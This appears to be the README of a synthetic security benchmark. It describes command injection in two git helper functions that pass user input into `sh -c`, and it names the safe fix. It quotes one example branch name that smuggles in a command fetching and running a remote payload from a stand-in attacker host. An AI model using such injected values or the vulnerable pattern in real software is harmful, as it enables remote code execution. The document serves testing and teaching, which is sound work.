# Command Injection in Git Operations

This is a synthetic benchmark containing git helper functions used by the pipeline
execution module. Two functions (`create_branch` and `commit_changes`) construct
shell command strings by interpolating user-controlled input directly into
`sh -c` invocations, creating command injection vulnerabilities.

An attacker who controls the branch name or commit message can inject arbitrary
shell commands. For example, a branch name like `main; curl attacker.com/x | sh`
would execute a remote payload.

The fix is to use `Command::new("git").arg(...)` instead of `sh -c` with string
interpolation, which is already demonstrated by the safe `fetch_remote` and
`current_branch` functions in the same file.
